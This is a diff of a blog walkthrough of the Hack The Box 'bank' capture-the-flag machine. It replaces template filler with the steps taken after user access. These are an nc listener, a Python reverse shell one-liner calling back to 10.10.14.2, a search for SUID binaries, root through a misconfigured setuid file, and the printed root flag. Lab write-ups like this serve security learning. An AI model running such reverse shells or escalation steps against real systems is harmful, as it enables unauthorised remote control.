@@ -7,11 +7,11 @@ gh-badge: [star, fork, follow]
 tags: [bank, hackthebox, htb, walkthrough, pentest]
 comments: true
 ---
-- Machine name: **bank**
-- Hosted on: **hackthebox.eu**
-- Type: **Capture the flag**
-- Goal: **Get the contain of user.txt and root.txt**
-- Time: **about 5h**
+Machine name: **bank**
+Hosted on: **hackthebox.eu**
+Type: **Capture the flag**
+Goal: **Get the contain of user.txt and root.txt**
+Time: **about 5h**
 
 We are going to do a penetration test of a nice machine from hackthebox.eu called bank. I made it in company of my work mate last [last](http://blog.notso.pro "last") in about 5 hours. This machine hasn't been so hard, but we had few problems to understand how to unlock the way to cross.
 The only information we received were the name of the machine
@@ -161,75 +161,86 @@ user.txt output:
 {: .box-success}
 **Success:** User Owned.
 
+it's now time to have a real shell for managing our new system :-)
 
-
-
-
-
-
-
-
-You can write regular [markdown](http://markdowntutorial.com/) here and Jekyll will automatically convert it to a nice webpage.  I strongly encourage you to [take 5 minutes to learn how to write in markdown](http://markdowntutorial.com/) - it'll teach you how to transform regular text into bold/italics/headings/tables/etc.
-
-**Here is some bold text**
-
-## Here is a secondary heading
-
-Here's a useless table:
-
-| Number | Next number | Previous number |
-| :------ |:--- | :--- |
-| Five | Six | Four |
-| Ten | Eleven | Nine |
-| Seven | Eight | Six |
-| Two | Three | One |
-
-
-How about a yummy crepe?
-
-![Crepe](https://s3-media3.fl.yelpcdn.com/bphoto/cQ1Yoa75m2yUFFbY2xwuqw/348s.jpg)
-
-Here's a code chunk:
+let's get ready our computer for receving connections through **nc** using the command
 
 ~~~
-var foo = function(x) {
-  return(x + 5);
-}
-foo(3)
+root@kali:~# nc -vv -n -l -p 1337
+~~~
+Our machine is now listening on the 1337 port. (Don't close this terminal!!!)
+
+let's launch on the webshell this command
+
+~~~
+python -c 'import socket,subprocess,os;
+s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);
+s.connect(("10.10.14.2",1337));
+os.dup2(s.fileno(),0);
+os.dup2(s.fileno(),1);
+os.dup2(s.fileno(),2);
+p=subprocess.call(["/bin/sh","-i"]);'
 ~~~
 
-And here is the same code with syntax highlighting:
+be sure to edit the 3°raw with your parameters **YOUR_IP** and **PORT**.
 
-```javascript
-var foo = function(x) {
-  return(x + 5);
-}
-foo(3)
-```
+come back on your **nc** terminal and you shold see something similar to:
 
-And here is the same code yet again but with line numbers:
+~~~
+root@kali:~# nc -vv -n -l -p 1337
+listening on [any] 1337 ...
+connect to [10.10.14.2] from (UNKNOWN) [10.10.10.29] 51390
+/bin/sh: 0: can't access tty; job control turned off
+$
+~~~
 
-{% highlight javascript linenos %}
-var foo = function(x) {
-  return(x + 5);
-}
-foo(3)
-{% endhighlight %}
+let's try to launch a command
 
-## Boxes
-You can add notification, warning and error boxes like this:
+~~~
+root@kali:~# nc -vv -n -l -p 1337
+listening on [any] 1337 ...
+connect to [10.10.14.2] from (UNKNOWN) [10.10.10.29] 51390
+/bin/sh: 0: can't access tty; job control turned off
+$ whoami
+www-data
+$ 
+~~~
+it works.
 
-### Notification
+for priviledge escalation we launched a command for checking all files with high priviledge 
 
-{: .box-note}
-**Note:** This is a notification box.
+~~~
+$ find / -type f \( -perm -4000 -o -perm -2000 \) -exec ls -l {} \; 2> /dev/null
+~~~
 
-### Warning
+and the first apperd so weird:
 
-{: .box-warning}
-**Warning:** This is a warning box.
+~~~
+-rwsr-xr-x 1 root root 112204 Jun 14  2017 `/var/htb/bin/emergency`
+~~~
 
-### Error
+Our friend sysadmin misconfigurating the system leaving an important vulnerability open, through this file anyboyd is able to become root.
 
-{: .box-error}
-**Error:** This is an error box.
+~~~
+cd /var/htb/bin/
+ls
+emergency
+./emergency
+whoami
+root
+~~~
+
+![found-not-encrypted](https://mrsaighnal.github.io/img/posts/2019-04-26-bank-walkthrough/whoami-root.png "whoami root")
+
+and get the root flag 
+
+~~~
+cat /root/root.txt  
+d5be56adc67b488f81a4b9de30c8a68e
+~~~
+
+
+![found-not-encrypted](https://mrsaighnal.github.io/img/posts/2019-04-26-bank-walkthrough/root-flag.png "root owned")
+
+{: .box-success}
+**Success:** Root Owned.
